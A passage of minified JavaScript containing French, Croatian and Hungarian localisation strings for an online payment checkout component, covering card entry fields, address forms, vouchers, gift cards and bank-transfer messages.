produite","idealIssuer.selectField.title":"Banque","idealIssuer.selectField.placeholder":"Sélectionnez votre banque","creditCard.success":"Paiement réussi",loading:"Chargement en cours...",continue:"Continuer",continueTo:"Poursuivre vers","wechatpay.timetopay":"Vous avez %@ pour payer cette somme","wechatpay.scanqrcode":"Scanner le code QR",personalDetails:"Informations personnelles",companyDetails:"Coordonnées de l'entreprise","companyDetails.name":"Nom de l'entreprise","companyDetails.registrationNumber":"Numéro d'enregistrement",socialSecurityNumber:"Numéro de sécurité sociale",firstName:"Prénom",infix:"Préfixe",lastName:"Nom de famille",mobileNumber:"Numéro de portable","mobileNumber.invalid":"Numéro de portable non valide",city:"Ville",postalCode:"Code postal",countryCode:"Code pays",telephoneNumber:"Numéro de téléphone",dateOfBirth:"Date de naissance",shopperEmail:"Adresse e-mail",gender:"Sexe",male:"Homme",female:"Femme",billingAddress:"Adresse de facturation",street:"Rue",stateOrProvince:"État ou province",country:"Pays",houseNumberOrName:"Numéro de rue",separateDeliveryAddress:"Indiquer une adresse de livraison distincte",deliveryAddress:"Adresse de livraison",zipCode:"Code postal",apartmentSuite:"Appartement",provinceOrTerritory:"Province ou territoire",cityTown:"Ville",address:"Adresse",state:"État","field.title.optional":"(facultatif)","creditCard.cvcField.title.optional":"CVC / CVV (facultatif)","issuerList.wallet.placeholder":"Sélectionnez votre portefeuille",privacyPolicy:"Politique de confidentialité","afterPay.agreement":"J'accepte les %@ de AfterPay",paymentConditions:"conditions de paiement",openApp:"Ouvrir l'application","voucher.readInstructions":"Lire les instructions","voucher.introduction":"Merci pour votre achat, veuillez utiliser le coupon suivant pour finaliser votre paiement.","voucher.expirationDate":"Date d'expiration","voucher.alternativeReference":"Autre référence","dragonpay.voucher.non.bank.selectField.placeholder":"Sélectionnez votre fournisseur","dragonpay.voucher.bank.selectField.placeholder":"Sélectionnez votre banque","voucher.paymentReferenceLabel":"Référence du paiement","voucher.surcharge":"Comprend une surcharge de %@","voucher.introduction.doku":"Nous vous remercions de votre achat. Veuillez finaliser votre paiement à l'aide des informations suivantes.","voucher.shopperName":"Nom de l'acheteur","voucher.merchantName":"Marchand","voucher.introduction.econtext":"Nous vous remercions de votre achat. Veuillez finaliser votre paiement à l'aide des informations suivantes.","voucher.telephoneNumber":"Numéro de téléphone","voucher.shopperReference":"Référence client","voucher.collectionInstitutionNumber":"Numéro du point de paiement","voucher.econtext.telephoneNumber.invalid":"Le numéro de téléphone doit comporter 10 ou 11 chiffres","boletobancario.btnLabel":"Générer un Boleto","boleto.sendCopyToEmail":"Envoyer une copie à mon adresse e-mail","button.copy":"Copier","button.download":"Télécharger","creditCard.storedCard.description.ariaLabel":"La carte enregistrée se termine en %@","voucher.entity":"Entité",donateButton:"Faire un don",notNowButton:"Pas maintenant",thanksForYourSupport:"Merci de votre soutien !",preauthorizeWith:"Pré-autoriser avec",confirmPreauthorization:"Confirmer la pré-autorisation",confirmPurchase:"Confirmer l'achat",applyGiftcard:"Utiliser",giftcardBalance:"Solde de la carte cadeau",deductedBalance:"Solde déduit","creditCard.pin.title":"PIN","creditCard.encryptedPassword.label":"Les deux premiers chiffres du code de votre carte","creditCard.encryptedPassword.placeholder":"12","creditCard.encryptedPassword.invalid":"Code incorrect","creditCard.taxNumber.label":"Date de naissance du porteur de carte (au format AAMMJJ) ou numéro d'identification de l'entreprise (à 10 chiffres)","creditCard.taxNumber.labelAlt":"Numéro d'identification de l'entreprise (à 10 chiffres)","creditCard.taxNumber.invalid":"Date de naissance du porteur de carte ou numéro d'identification de l'entreprise incorrect(e)","storedPaymentMethod.disable.button":"Supprimer","storedPaymentMethod.disable.confirmation":"Supprimer le mode de paiement enregistré","storedPaymentMethod.disable.confirmButton":"Oui, supprimer","storedPaymentMethod.disable.cancelButton":"Annuler","ach.bankAccount":"Compte bancaire","ach.accountHolderNameField.title":"Nom du titulaire du compte","ach.accountHolderNameField.placeholder":"J. Smith","ach.accountHolderNameField.invalid":"Nom du titulaire du compte incorrect","ach.accountNumberField.title":"Numéro du compte","ach.accountNumberField.invalid":"Numéro du compte incorrect","ach.accountLocationField.title":"Code ABA","ach.accountLocationField.invalid":"Code ABA incorrect","select.state":"Sélectionnez l'État","select.stateOrProvince":"Sélectionnez l'État ou la province","select.provinceOrTerritory":"Sélectionnez la province ou le territoire","select.country":"Sélectionnez le pays","select.noOptionsFound":"Aucune option trouvée","select.filter.placeholder":"Recherche...","telephoneNumber.invalid":"Numéro de téléphone incorrect",qrCodeOrApp:"ou","paypal.processingPayment":"Traitement du paiement en cours...",generateQRCode:"Générer un code QR","await.waitForConfirmation":"En attente de confirmation","mbway.confirmPayment":"Confirmez votre paiement sur l'application MB WAY","shopperEmail.invalid":"Adresse e-mail incorrecte","dateOfBirth.format":"JJ/MM/AAAA","dateOfBirth.invalid":"Vous devez être âgé(e) d'au moins 18 ans","blik.confirmPayment":"Ouvrez votre application bancaire pour confirmer le paiement.","blik.invalid":"Saisissez les 6 chiffres","blik.code":"Code à 6 chiffres","blik.help":"Ouvrez votre application bancaire pour obtenir le code.","swish.pendingMessage":"Après avoir scanné le code QR, la mise à jour du statut de paiement peut prendre jusqu'à 10 minutes. Si vous effectuez une nouvelle tentative de paiement dans ce délai, cela pourrait occasionner plusieurs débits.","error.va.gen.01":"Champ incomplet","error.va.gen.02":"Champ non valide","error.va.sf-cc-num.01":"Numéro de carte non valide","error.va.sf-cc-num.03":"Carte insérée non prise en charge","error.va.sf-cc-dat.01":"Carte trop ancienne","error.va.sf-cc-dat.02":"La date doit être plus proche","error.va.sf-cc-dat.03":"Votre carte expirera avant la date de paiement","error.giftcard.no-balance":"Aucun solde n'est disponible sur cette carte cadeau","error.giftcard.card-error":"Aucune carte cadeau ne correspond à ce numéro","error.giftcard.currency-error":"Les cartes cadeaux sont valables uniquement dans la devise dans laquelle elles ont été émises","amazonpay.signout":"Se déconnecter d'Amazon","amazonpay.changePaymentDetails":"Modifier les informations de paiement","partialPayment.warning":"Sélectionnez un autre mode de paiement pour régler le solde","partialPayment.remainingBalance":"Le solde restant sera de %{amount}","bankTransfer.beneficiary":"Bénéficiaire","bankTransfer.iban":"IBAN","bankTransfer.bic":"BIC","bankTransfer.reference":"Référence","bankTransfer.introduction":"Continuez à créer un nouveau paiement par virement bancaire. Utilisez les informations de l'écran suivant pour finaliser ce paiement.","bankTransfer.instructions":"Merci pour votre achat ! Veuillez utiliser les informations suivantes pour finaliser votre paiement.","bacs.accountHolderName":"Nom du titulaire du compte bancaire","bacs.accountHolderName.invalid":"Nom du titulaire du compte bancaire incorrect","bacs.accountNumber":"Numéro du compte bancaire","bacs.accountNumber.invalid":"Numéro du compte bancaire incorrect","bacs.bankLocationId":"Code de tri (sort code)","bacs.bankLocationId.invalid":"Code de tri (sort code) non valide","bacs.consent.amount":"J'accepte que le montant ci-dessus soit déduit de mon compte bancaire.","bacs.consent.account":"Je confirme être le titulaire du compte et qu'aucune autre signature que la mienne n'est requise pour autoriser un prélèvement sur ce compte.",edit:"Modifier","bacs.confirm":"Confirmer et payer","bacs.result.introduction":"Téléchargez votre mandat de prélèvement (DDI)","download.pdf":"Télécharger le PDF","creditCard.encryptedCardNumber.aria.iframeTitle":"Iframe pour le numéro de carte avec garantie","creditCard.encryptedCardNumber.aria.label":"Champ du numéro de carte","creditCard.encryptedExpiryDate.aria.iframeTitle":"Iframe pour la date d'expiration de la carte avec garantie","creditCard.encryptedExpiryDate.aria.label":"Champ de la date d'expiration","creditCard.encryptedExpiryMonth.aria.iframeTitle":"Iframe pour le mois d'expiration de la carte avec garantie","creditCard.encryptedExpiryMonth.aria.label":"Champ du mois d'expiration","creditCard.encryptedExpiryYear.aria.iframeTitle":"Iframe pour l'année d'expiration de la carte avec garantie","creditCard.encryptedExpiryYear.aria.label":"Champ de l'année d'expiration","creditCard.encryptedSecurityCode.aria.iframeTitle":"Iframe pour le code de sécurité de la carte avec garantie","creditCard.encryptedSecurityCode.aria.label":"Champ du code de sécurité","giftcard.encryptedCardNumber.aria.iframeTitle":"Iframe pour le numéro de la carte-cadeau avec garantie","giftcard.encryptedCardNumber.aria.label":"Champ du numéro de la carte cadeau","giftcard.encryptedSecurityCode.aria.iframeTitle":"Iframe pour le code de sécurité de la carte-cadeau avec garantie","giftcard.encryptedSecurityCode.aria.label":"Champ du code de sécurité de la carte-cadeau",giftcardTransactionLimit:"Montant maximum autorisé par transaction avec cette carte cadeau : %{amount}","ach.encryptedBankAccountNumber.aria.iframeTitle":"Iframe pour le numéro du compte bancaire avec garantie","ach.encryptedBankAccountNumber.aria.label":"Champ du compte bancaire","ach.encryptedBankLocationId.aria.iframeTitle":"Iframe pour le numéro de routage du compte avec garantie","ach.encryptedBankLocationId.aria.label":"Champ du numéro de routage"}}),Wv=Object.freeze({__proto__:null,default:{payButton:"Platiti","payButton.redirecting":"Preusmjeravanje...",storeDetails:"Pohrani za moje sljedeće plaćanje","creditCard.holderName":"Ime na kartici","creditCard.holderName.placeholder":"J. Smith","creditCard.holderName.invalid":"Nevažeće ime vlasnika kartice","creditCard.numberField.title":"Broj kartice","creditCard.numberField.placeholder":"1234 5678 9012 3456","creditCard.expiryDateField.title":"Datum isteka","creditCard.expiryDateField.placeholder":"MM/GG","creditCard.expiryDateField.month":"Mjesec","creditCard.expiryDateField.month.placeholder":"MM","creditCard.expiryDateField.year.placeholder":"GG","creditCard.expiryDateField.year":"Godina","creditCard.cvcField.title":"CVC/CVV","creditCard.cvcField.placeholder":"123","creditCard.storeDetailsButton":"Zapamtiti za sljedeći put","creditCard.cvcField.placeholder.4digits":"4 znamenke","creditCard.cvcField.placeholder.3digits":"3 znamenke","creditCard.taxNumber.placeholder":"YYMMDD / 0123456789",installments:"Broj rata",installmentOption:"%{times} x %{partialValue}",installmentOptionMonths:"Mjeseci: %{times}","installments.oneTime":"Jednokratno plaćanje","installments.installments":"Plaćanje na rate","installments.revolving":"Obnovljivo plaćanje","sepaDirectDebit.ibanField.invalid":"Nevažeći broj računa","sepaDirectDebit.nameField.placeholder":"J. Smith","sepa.ownerName":"Ime vlasnika","sepa.ibanNumber":"Broj računa (IBAN)","error.title":"Greška","error.subtitle.redirect":"Preusmjeravanje nije uspjelo","error.subtitle.payment":"Plaćanje nije uspjelo","error.subtitle.refused":"Plaćanje odbijeno","error.message.unknown":"Dogodila se nepoznata greška","idealIssuer.selectField.title":"Banka","idealIssuer.selectField.placeholder":"Odaberite banku","creditCard.success":"Plaćanje uspješno",loading:"Učitavanje…",continue:"Nastavi",continueTo:"Nastavi na","wechatpay.timetopay":"Imate %@ za plaćanje","wechatpay.scanqrcode":"Skeniraj QR kôd",personalDetails:"Osobni podatci",companyDetails:"Detalji tvrtke","companyDetails.name":"Naziv tvrtke","companyDetails.registrationNumber":"Matični broj",socialSecurityNumber:"Broj socijalnog osiguranja",firstName:"Ime",infix:"Prefiks",lastName:"Prezime",mobileNumber:"Broj mobilnog telefona","mobileNumber.invalid":"Nevažeći broj mobilnog telefona",city:"Grad",postalCode:"Poštanski broj",countryCode:"Pozivni broj države",telephoneNumber:"Telefonski broj",dateOfBirth:"Datum rođenja",shopperEmail:"Adresa e-pošte",gender:"Spol",male:"Muškarac",female:"Žena",billingAddress:"Adresa za račun",street:"Ulica",stateOrProvince:"Država ili pokrajina",country:"Zemlja",houseNumberOrName:"Kućni broj",separateDeliveryAddress:"Navedite zasebnu adresu za dostavu",deliveryAddress:"Adresa za dostavu",zipCode:"Poštanski broj",apartmentSuite:"Stan/apartman",provinceOrTerritory:"Pokrajina ili teritorij",cityTown:"Grad",address:"Adresa",state:"Savezna država","field.title.optional":"(neobavezno)","creditCard.cvcField.title.optional":"CVC/CVV (nije obavezno)","issuerList.wallet.placeholder":"Odaberite svoju novčanik",privacyPolicy:"Politika privatnosti","afterPay.agreement":"Slažem se s %@ usluge AfterPay",paymentConditions:"uvjetima plaćanja",openApp:"Otvorite aplikaciju","voucher.readInstructions":"Pročitajte upute","voucher.introduction":"Zahvaljujemo na kupnji, upotrijebite sljedeći kupon za dovršetak plaćanja.","voucher.expirationDate":"Datum isteka","voucher.alternativeReference":"Alternativna referenca","dragonpay.voucher.non.bank.selectField.placeholder":"Odaberite davatelja usluge","dragonpay.voucher.bank.selectField.placeholder":"Odaberite banku","voucher.paymentReferenceLabel":"Referenca za plaćanje","voucher.surcharge":"Uključuje %@ nadoplate","voucher.introduction.doku":"Zahvaljujemo na kupnji, upotrijebite sljedeće podatke za dovršetak plaćanja.","voucher.shopperName":"Ime kupca","voucher.merchantName":"Trgovac","voucher.introduction.econtext":"Zahvaljujemo na kupnji, upotrijebite sljedeće podatke za dovršetak plaćanja.","voucher.telephoneNumber":"Broj telefona","voucher.shopperReference":"Referenca kupca","voucher.collectionInstitutionNumber":"Broj ustanove za prikupljanje","voucher.econtext.telephoneNumber.invalid":"Telefonski broj mora imati 10 ili 11 znamenki","boletobancario.btnLabel":"Generiraj Boleto","boleto.sendCopyToEmail":"Pošalji kopiju na moju e-poštu","button.copy":"Kopiraj","button.download":"Preuzmi","creditCard.storedCard.description.ariaLabel":"Pohranjena kartica završava na %@","voucher.entity":"Entitet",donateButton:"Doniraj",notNowButton:"Ne sada",thanksForYourSupport:"Hvala na podršci!",preauthorizeWith:"Prethodno odobri s",confirmPreauthorization:"Potvrdite prethodno odobrenje",confirmPurchase:"Potvrdite kupnju",applyGiftcard:"Iskoristite",giftcardBalance:"Stanje na poklon-kartici",deductedBalance:"Potrošeni iznos","creditCard.pin.title":"Pin","creditCard.encryptedPassword.label":"Prve 2 znamenke lozinke kartice","creditCard.encryptedPassword.placeholder":"12","creditCard.encryptedPassword.invalid":"Lozinka je netočna","creditCard.taxNumber.label":"Datum rođenja vlasnika kartice (GGMMDD) ili registracijski broj tvrtke (10 znamenki)","creditCard.taxNumber.labelAlt":"Registracijski broj tvrtke (10 znamenki)","creditCard.taxNumber.invalid":"Netočan datum rođenja vlasnika kartice (GGMMDD) ili registracijski broj tvrtke (10 znamenki)","storedPaymentMethod.disable.button":"Ukloni","storedPaymentMethod.disable.confirmation":"Uklonite pohranjeni način plaćanja","storedPaymentMethod.disable.confirmButton":"Da, ukloni","storedPaymentMethod.disable.cancelButton":"Otkaži","ach.bankAccount":"Bankovni račun","ach.accountHolderNameField.title":"Ime vlasnika računa","ach.accountHolderNameField.placeholder":"J. Smith","ach.accountHolderNameField.invalid":"Nevažeće ime vlasnika računa","ach.accountNumberField.title":"Broj računa","ach.accountNumberField.invalid":"Nevažeći broj računa","ach.accountLocationField.title":"ABA identifikacijski broj","ach.accountLocationField.invalid":"Nevažeći ABA identifikacijski broj","select.state":"Odaberite saveznu državu","select.stateOrProvince":"Odaberite državu ili provinciju","select.provinceOrTerritory":"Odaberite provinciju ili teritorij","select.country":"Odaberite državu","select.noOptionsFound":"Nije pronađena nijedna opcija","select.filter.placeholder":"Traži...","telephoneNumber.invalid":"Nevažeći telefonski broj",qrCodeOrApp:"ili","paypal.processingPayment":"Obrada plaćanja u tijeku...",generateQRCode:"Generirajte QR kôd","await.waitForConfirmation":"Čeka se potvrda","mbway.confirmPayment":"Potvrdite uplatu u aplikaciji MB WAY","shopperEmail.invalid":"Nevažeća adresa e-pošte","dateOfBirth.format":"DD/MM/GGGG","dateOfBirth.invalid":"Morate imati najmanje 18 godina","blik.confirmPayment":"Otvorite svoju bankovnu aplikaciju kako biste potvrdili plaćanje.","blik.invalid":"Unesite 6 znamenki","blik.code":"6-znamenkasti kôd","blik.help":"Preuzmite kôd iz bankovne aplikacije.","swish.pendingMessage":"Nakon skeniranja status može biti na čekanju do 10 minuta. Pokušaj ponovnog plaćanja u istom periodu može rezultirati višestrukim naplatama.","error.va.gen.01":"Nepotpuno polje","error.va.gen.02":"Nevažeće polje","error.va.sf-cc-num.01":"Nevažeći broj kartice","error.va.sf-cc-num.03":"Unijeli ste nepodržanu vrstu kartice","error.va.sf-cc-dat.01":"Kartica je prestara","error.va.sf-cc-dat.02":"Datum je predaleko u budućnosti","error.va.sf-cc-dat.03":"Vaša kartica istječe prije datuma plaćanja","error.giftcard.no-balance":"Stanje na ovoj poklon-kartici iznosi nula","error.giftcard.card-error":"U našoj evidenciji nemamo poklon-karticu s ovim brojem","error.giftcard.currency-error":"Poklon-kartice vrijede samo u valuti u kojoj su izdane","amazonpay.signout":"Odjava iz Amazona","amazonpay.changePaymentDetails":"Promijenite pojedinosti o plaćanju","partialPayment.warning":"Odaberite drugi način plaćanja da biste platili preostali iznos","partialPayment.remainingBalance":"Preostalo stanje na računu iznosit će %{amount}","bankTransfer.beneficiary":"Primatelj","bankTransfer.iban":"IBAN","bankTransfer.bic":"BIC","bankTransfer.reference":"Referenca","bankTransfer.introduction":"Nastavite da biste kreirali novu uplatu putem bankovne transakcije. Za finaliziranje ovog plaćanja možete se koristiti pojedinostima na sljedećem zaslonu.","bankTransfer.instructions":"Zahvaljujemo na kupnji, upotrijebite sljedeće podatke za dovršetak plaćanja.","bacs.accountHolderName":"Ime vlasnika bankovnog računa","bacs.accountHolderName.invalid":"Nevažeće ime vlasnika bankovnog računa","bacs.accountNumber":"Broj bankovnog računa","bacs.accountNumber.invalid":"Nevažeći broj bankovnog računa","bacs.bankLocationId":"Identifikacijski kôd banke (UK)","bacs.bankLocationId.invalid":"Nevažeći identifikacijski kôd banke (UK)","bacs.consent.amount":"Slažem se da se gore navedeni iznos oduzme s mog bankovnog računa.","bacs.consent.account":"Potvrđujem da je račun na moje ime i da sam jedini potpisnik potreban za autorizaciju izravnog terećenja na ovom računu.",edit:"Uredi","bacs.confirm":"Potvrdi i plati","bacs.result.introduction":"Preuzmite upute za izravno terećenje (DDI / mandat)","download.pdf":"Preuzmite PDF","creditCard.encryptedCardNumber.aria.iframeTitle":"Iframe za broj prepaid kartice","creditCard.encryptedCardNumber.aria.label":"Polje za broj kartice","creditCard.encryptedExpiryDate.aria.iframeTitle":"Iframe za datum isteka prepaid kartice","creditCard.encryptedExpiryDate.aria.label":"Polje za datum isteka","creditCard.encryptedExpiryMonth.aria.iframeTitle":"Iframe za mjesec isteka prepaid kartice","creditCard.encryptedExpiryMonth.aria.label":"Polje za mjesec isteka","creditCard.encryptedExpiryYear.aria.iframeTitle":"Iframe za godinu isteka prepaid kartice","creditCard.encryptedExpiryYear.aria.label":"Polje za godinu isteka","creditCard.encryptedSecurityCode.aria.iframeTitle":"Iframe za sigurnosni kôd prepaid kartice","creditCard.encryptedSecurityCode.aria.label":"Polje za sigurnosni kôd","giftcard.encryptedCardNumber.aria.iframeTitle":"Iframe za broj prepaid poklon-kartice","giftcard.encryptedCardNumber.aria.label":"Polje za broj poklon-kartice","giftcard.encryptedSecurityCode.aria.iframeTitle":"Iframe za sigurnosni kôd prepaid poklon-kartice","giftcard.encryptedSecurityCode.aria.label":"Polje za sigurnosni kôd poklon-kartice",giftcardTransactionLimit:"Na ovoj je poklon-kartici maks. dopušteno %{amount} po transakciji","ach.encryptedBankAccountNumber.aria.iframeTitle":"Iframe za prepaid broj bankovnog računa","ach.encryptedBankAccountNumber.aria.label":"Polje za broj bankovnog računa","ach.encryptedBankLocationId.aria.iframeTitle":"Iframe za identifikacijski broj prepaid banke","ach.encryptedBankLocationId.aria.label":"Polje za identifikacijski broj banke"}}),Kv=Object.freeze({__proto__:null,default:{payButton:"Fizetés","payButton.redirecting":"Átirányítás...",storeDetails:"Mentés a következő fizetéshez","creditCard.holderName":"A kártyán szereplő név","creditCard.holderName.placeholder":"Gipsz Jakab","creditCard.holderName.invalid":"A kártyatulajdonos neve érvénytelen","creditCard.numberField.title":"Kártyaszám","creditCard.numberField.placeholder":"1234 5678 9012 3456","creditCard.expiryDateField.title":"Lejárati dátum","creditCard.expiryDateField.placeholder":"HH/ÉÉ","creditCard.expiryDateField.month":"Hónap","creditCard.expiryDateField.month.placeholder":"HH","creditCard.expiryDateField.year.placeholder":"ÉÉ","creditCard.expiryDateField.year":"Év","creditCard.cvcField.title":"CVC/CVV","creditCard.cvcField.placeholder":"123","creditCard.storeDetailsButton":"Megjegyzés a következő alkalomra","creditCard.cvcField.placeholder.4digits":"4 számjegyű","creditCard.cvcField.placeholder.3digits":"3 számjegyű","creditCard.taxNumber.placeholder":"ÉÉHHNN / 0123456789",installments:"Részletek száma",installmentOption:"%{times} x %{partialValue}",installmentOptionMonths:"%{times} hónap","installments.oneTime":"Egyösszegű fizetés","installments.installments":"Részletfizetés","installments.revolving":"Többösszegű fizetés","sepaDirectDebit.ibanField.invalid":"Érvénytelen számlaszám","sepaDirectDebit.nameField.placeholder":"Gipsz Jakab","sepa.ownerName":"Számlatulajdonos neve","sepa.ibanNumber":"Számlaszám (IBAN)","error.title":"Hiba","error.subtitle.redirect":"Sikertelen átirányítás","error.subtitle.payment":"Sikertelen fizetés","error.subtitle.refused":"A fizetés elutasítva","error.message.unknown":"Ismeretlen hiba történt","idealIssuer.selectField.title":"Bank","idealIssuer.selectField.placeholder":"Bank kiválasztása","creditCard.success":"Sikeres fizetés",loading:"Betöltés…",continue:"Folytatás",continueTo:"Folytatás a következővel:","wechatpay.timetopay":"Fizetéshez rendelkezésre álló idő: %@","wechatpay.scanqrcode":"QR-kód beolvasása",personalDetails:"Személyes adatok",companyDetails:"Cég adatai","companyDetails.name":"Cégnév","companyDetails.registrationNumber":"Cégjegyzékszám",socialSecurityNumber:"Személyi igazolvány száma",firstName:"Keresztnév",infix:"Előtag",lastName:"Vezetéknév",mobileNumber:"Mobiltelefonszám","mobileNumber.invalid":"Érvénytelen mobilszám",city:"Város",postalCode:"Irányítószám",countryCode:"Országkód",telephoneNumber:"Telefonszám",dateOfBirth:"Születési dátum",shopperEmail:"E-mail-cím",gender:"Nem",male:"Férfi",female:"Nő",billingAddress:"Számlázási cím",street:"Utca",stateOrProvince:"Állam vagy tartomány",country:"Ország",houseNumberOrName:"Házszám",separateDeliveryAddress:"Eltérő szállítási cím megadása",deliveryAddress:"Szállítási cím",zipCode:"Irányítószám",apartmentSuite:"Lakás/ajtószám",provinceOrTerritory:"Tartomány vagy terület",cityTown:"Város",address:"Cím",state:"Állam","field.title.optional":"(nem kötelező)","creditCard.cvcField.title.optional":"CVC/CVV (opcionális)","issuerList.wallet.placeholder":"Pénztárca kiválasztása",privacyPolicy:"Adatvédelmi szabályzat","afterPay.agreement":"Elfogadom az AfterPay %@",paymentConditions:"fizetési feltételeit",openApp:"Alkalmazás megnyitása","voucher.readInstructions":"Olvassa el az utasításokat","voucher.introduction":"Köszönjük a vásárlást! Kérjük, a fizetéshez használja a következő kupont.","voucher.expirationDate":"Lejárati dátum","voucher.alternativeReference":"Alternatív hivatkozás","dragonpay.voucher.non.bank.selectField.placeholder":"Szolgáltató kiválasztása","dragonpay.voucher.bank.selectField.placeholder":"Bank kiválasztása","voucher.paymentReferenceLabel":"Fizetési referencia","voucher.surcharge":"%@ pótdíjat tartalmaz","voucher.introduction.doku":"Köszönjük a vásárlást! Kérjük, a fizetéshez használja a következő információt.","voucher.shopperName":"Vásárló neve","voucher.merchantName":"Kereskedő","voucher.introduction.econtext":"Köszönjük a vásárlást! Kérjük, a fizetéshez használja a következő információt.","voucher.telephoneNumber":"Telefonszám","voucher.shopperReference":"Vásárlói referencia","voucher.collectionInstitutionNumber":"Beszedő cég száma","voucher.econtext.telephoneNumber.invalid":"A telefonszámnak 10 vagy 11 számjegyből kell állnia","boletobancario.btnLabel":"Boleto létrehozása","boleto.sendCopyToEmail":"Másolat küldése az e-mail-címemre","button.copy":"Másolás","button.download":"Letöltés","creditCard.storedCard.description.ariaLabel":"A tárolt kártya számának végződése: %@","voucher.entity":"Entitás",donateButton:"Adományozás",notNowButton:"Most nem",thanksForYourSupport:"Köszönjük a támogatását!",preauthorizeWith:"Előzetes meghatalmazás a következővel:",confirmPreauthorization:"Előzetes meghatalmazás jóváhagyása",confirmPurchase:"Fizetés jóváhagyása",applyGiftcard:"Beváltás",giftcardBalance:"Ajándékkártya egyenlege",deductedBalance:"Levont egyenleg","creditCard.pin.title":"PIN-kód","creditCard.encryptedPassword.label":"Kártya jelszavának első 2 számjegye","creditCard.encryptedPassword.placeholder":"12","creditCard.encryptedPassword.invalid":"Érvénytelen jelszó","creditCard.taxNumber.label":"Kártyatulajdonos születési dátuma (ÉÉHHNN) vagy cégjegyzékszám (10 számjegyű)","creditCard.taxNumber.labelAlt":"Cégjegyzékszám (10 számjegyű)","creditCard.taxNumber.invalid":"A kártyatulajdonos születési dátuma vagy a cégjegyzékszám érvénytelen","storedPaymentMethod.disable.button":"Eltávolítás","storedPaymentMethod.disable.confirmation":"Tárolt fizetési mód eltávolítása","storedPaymentMethod.disable.confirmButton":"Igen, eltávolítom","storedPaymentMethod.disable.cancelButton":"Mégse","ach.bankAccount":"Bankszámla","ach.accountHolderNameField.title":"Számlatulajdonos neve","ach.accountHolderNameField.placeholder":"Gipsz Jakab","ach.accountHolderNameField.invalid":"A számlatulajdonos neve érvénytelen","ach.accountNumberField.title":"Számlaszám","ach.accountNumberField.invalid":"Érvénytelen számlaszám","ach.accountLocationField.title":"ABA-irányítószám","ach.accountLocationField.invalid":"Érvénytelen ABA-irányítószám","select.state":"Állam kiválasztása","select.stateOrProvince":"Állam vagy tartomány kiválasztása","select.provinceOrTerritory":"Tartomány vagy terület kiválasztása","select.country":"Ország kiválasztása","select.noOptionsFound":"Nincsenek találatok","select.filter.placeholder":"Keresés...","telephoneNumber.invalid":"Érvénytelen telefonszám",qrCodeOrApp:"vagy","paypal.processingPayment":"Fizetés feldolgozása…",generateQRCode:"QR-kód létrehozása","await.waitForConfirmation":"Várakozás a jóváhagyásra","mbway.confirmPayment":"Fizetés jóváhagyása az MB WAY alkalmazásban","shopperEmail.invalid":"Érvénytelen e-mail-cím","dateOfBirth.format":"NN/HH/ÉÉÉÉ","dateOfBirth.invalid":"Legalább 18 évesnek kell lennie","blik.confirmPayment":"A fizetés jóváhagyásához nyissa meg a banki alkalmazást.","blik.invalid":"Adjon meg 6 számjegyet","blik.code":"6 számjegyű kód","blik.help":"Kód lekérése a banki alkalmazásból.","swish.pendingMessage":"A QR-kód beolvasását követően az állapot akár 10 percig is függőben lehet. Ha eközben újból fizetést kísérel meg, az többszöri fizetést eredményezhet.","error.va.gen.01":"Hiányos mező","error.va.gen.02":"Érvénytelen mező","error.va.sf-cc-num.01":"Érvénytelen kártyaszám","error.va.sf-cc-num.03":"A megadott kártya nem támogatott","error.va.sf-cc-dat.01":"A kártya túl régi","error.va.sf-cc-dat.02":"Túl távoli jövőbeli dátum","error.va.sf-cc-dat.03":"A kártya lejár a fizetés dátuma előtt","error.giftcard.no-balance":"Az ajándékkártya egyenlege nulla","error.giftcard.card-error":"Nyilvántartásunkban nem szerepel ilyen számú ajándékkártya","error.giftcard.currency-error":"Az ajándékkártyák csak abban a pénznemben érvényesek, amelyre kiállították azokat","amazonpay.signout":"Kijelentkezés az Amazonról","amazonpay.changePaymentDetails":"Fizetési adatok módosítása","partialPayment.warning":"Másik fizetési mód választása a fennmaradó rész fizetéséhez","partialPayment.remainingBalance":"A fennmaradó egyenleg %{amount} lesz","bankTransfer.beneficiary":"Kedvezményezett","bankTransfer.iban":"IBAN","bankTransfer.bic":"BIC","bankTransfer.reference":"Referencia","bankTransfer.introduction":"Folytassa, hogy elindítson egy új banki átutalásos fizetést. A fizetés véglegesítéséhez felhasználhatja a következő képernyőn megjelenő adatokat.","bankTransfer.instructions":"Köszönjük a vásárlást! Kérjük, a fizetéshez használja a következő információt.","bacs.accountHolderName":"Bankszámla-tulajdonos neve","bacs.accountHolderName.invalid":"A bankszámla-tulajdonos neve érvénytelen","bacs.accountNumber":"Bankszámlaszám","bacs.accountNumber.invalid":"Érvénytelen bankszámlaszám","bacs.bankLocationId":"Banki azonosító","bacs.bankLocationId.invalid":"Érvénytelen banki azonosító","bacs.consent.amount":"Elfogadom, hogy a fenti összeget levonják a bankszámlámról.","bacs.consent.account":"Megerősítem, hogy a bankszámla az én nevemen van, és én vagyok a bankszámlát érintő beszedési megbízás jóváhagyásához szükséges egyetlen aláíró.",edit:"Szerkesztés","bacs.confirm":"Megerősítés és fizetés","bacs.result.introduction":"Beszedési megbízási utasítás (meghatalmazás) letöltése","download.pdf":"PDF letöltése","creditCard.encryptedCardNumber.aria.iframeTitle":"Iframe a biztonságos kártyaszámhoz","creditCard.encryptedCardNumber.aria.label":"Kártyaszám mezője","creditCard.encryptedExpiryDate.aria.iframeTitle":"Iframe a biztonságos kártyalejárati dátumhoz","creditCard.encryptedExpiryDate.aria.label":"Lejárati dátum mezője","creditCard.encryptedExpiryMonth.aria.iframeTitle":"Iframe a biztonságos kártyalejárati hónaphoz","creditCard.encryptedExpiryMonth.aria.label":"Lejárati hónap mezője","creditCard.encryptedExpiryYear.aria.iframeTitle":"Iframe a biztonságos kártyalejárati évhez","creditCard.encryptedExpiryYear.aria.label":"Lejárati év mezője","creditCard.encryptedSecurityCode.aria.iframeTitle":"Iframe a biztonságos kártyabiztonsági kódhoz","creditCard.encryptedSecurityCode.aria.label":"Biztonsági kód mezője","giftcard.encryptedCardNumber.aria.iframeTitle":"Iframe a biztonságos ajándékkártyaszámhoz","giftcard.encryptedCardNumber.aria.label":"Ajándékkártyaszám mezője","giftcard.encryptedSecurityCode.aria.iframeTitle":"Iframe a biztonságos ajándékkártya biztonsági kódhoz","giftcard.encryptedSecurityCode.aria.label":"Ajándékkártya biztonsági kódjának mezője",giftcardTransactionLimit:"Ezen az ajándékkártyán a tranzakciónként engedélyezett maximális összeg %{amount}","ach.encryptedBankAccountNumber.aria.iframeTitle":"Iframe a biztonságos bankszámlaszámhoz","ach.encryptedBankAccountNumber.aria.label":"Bankszámla mezője","ach.encryptedBankLocationId.aria.iframeTitle":"Iframe a biztonságos bankazonosító 